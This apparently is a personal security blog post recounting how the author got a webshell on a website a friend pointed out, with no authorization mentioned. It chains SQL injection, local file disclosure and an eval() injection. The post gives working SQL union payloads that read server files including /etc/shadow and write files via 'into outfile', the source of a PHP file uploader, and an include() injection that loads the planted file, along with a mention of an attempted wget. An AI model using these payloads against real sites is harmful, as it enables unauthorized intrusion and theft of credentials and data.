---
layout: post
title:  "Chaining Multiple Vulnerabilities To Get A Shell "
date:   2021-09-24 09:17:08 +0100
tags: sqli fpd lfd
---

![]({{site.url}}/images/CMV/main.png){:width="100%"}

# 0x00 - MySQL Injection
It started when I got a message from a friend asking if I could manage to get a webshell on a SQLi vulnerable website. 
 
He sent the page to me and said it's vulnerable to SQLi, so I injected the page, listed all the tables/columns, it was a simple union based injection and there was nothing interesting in tables (no users, admins, etc) 
 
However, the current sql user had FILE privileges, so I said to myself, this seems easy enough, all I've to do is find the full path and we have a shell. 
![]({{site.url}}/images/CMV/chain.png){:width="100%"}
# 0x01 - Hunting for FPD
The SQLi vulnerable page had errors disabled, so I didn't get the full path from there, it was running on Apache so I tried doing 

{% highlight sql %}
sqli.php?id=1' union select 1,load_file("Path to Apache HTTP Config"),3 -- - 
{% endhighlight %}

<br>Tried all the possible locations that I could think of but it wasn't there :( .. So I started looking for phpinfo file, testing other files by sending arrays as parameters, etc and found a file called download.php, it was vulnerable to Local File Disclosure, tried downloading /etc/shadow and ta-da!<br>
![]({{site.url}}/images/CMV/fpd.png){:width="100%"}
<br>Got the full path, back to SQLi and we'll have a shell in no time! 
 
# 0x00 - Hello again!
Now I have a SQLi vulnerable page, have the full path and the user has FILE privileges .. So I tried: 

{% highlight sql %}
sqli.php?id=1' union select 1,0xSHELL,3 into outfile "/var/www/www_v1/images/shell.php" -- - 
{% endhighlight %}

<br>and nothing .. tried all the possible directories that I thought would be writable (documents, css, etc) but still no shell :(
 
I started viewing sources of other PHPs in hopes of finding a writable directory, after a few tries I loaded a file which was including another file, loaded that file and found this 

{% highlight sql %}
sqli.php?id=1' union select 1,load_file('/var/www/www_v1/pci.php'),3 -- - 
{% endhighlight %}

{% highlight php linenos %}
<?php
...
$ArrayParameters = array_merge($_POST, $_GET);
$ArrayParameters = filtro($ArrayParameters);
$action = "";
if (isset($ArrayParameters['action'])) {
    $action = $ArrayParameters['action'];
}
if ($action == "") {
    $action = "Index";
}

eval($action . "Action(\$ArrayParameters);");
...
?>
{% endhighlight %}

<br>and here's filtro(), a poor attempt at trying to protect against HTML injection (or something else, I have no clue tbh), It's like the dev was trying to fix windows of a house which has no doors 

{% highlight php linenos %}
function filtro($arraypost) {
    $filteredArray = Array();

    foreach ($arraypost as $variable => $value) {
        $chars = array("-");
        $fixedVariable = str_replace($chars, "-", $value);
        $fixedVariable = str_replace("\"", "", $fixedVariable);
        $fixedVariable = str_replace("<br />", "<br />", $fixedVariable);
        $fixedVariable = str_replace("<br />", "<br />", $fixedVariable);
        $filteredArray[$variable] = $fixedVariable;
    }
    return $filteredArray;
}
{% endhighlight %}

<br>Tried doing a quick `system('wget ...')` but looked like it was disabled along with some of the usual stuff (inc. allow_url_\*), I got pretty anxious so instead of coming up with a workaround, I just used the SQLi that I had.
{% highlight php linenos %}
<?php
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="file"><input name="submit" type="submit" value=">>"></form>';
if ($_POST['submit'] == ">>") {
    if (copy($_FILES['file']['tmp_name'], "/tmp/" . $_FILES['file']['name'])) {
        echo 'Done!<br>';
    } else {
        echo 'Error<br>';
    }
}
?>
{% endhighlight %}
{% highlight sql %}
sqli.php?id=1' union select 1,0xUPLOADER,3 into outfile '/tmp/skidalot' -- -
sqli.php?id=1' union select 1,load_file('/tmp/skidalot'),3 -- - 
{% endhighlight %}
![]({{site.url}}/images/CMV/uploader.png){:height="250px" width="300px"}

After I uploaded the uploader to `/tmp/skidalot`, I "included" it and uploaded the webshell
{% highlight bash %}
pci.php?action=include('/tmp/skidalot');
{% endhighlight %}

# $ cat /etc/motd
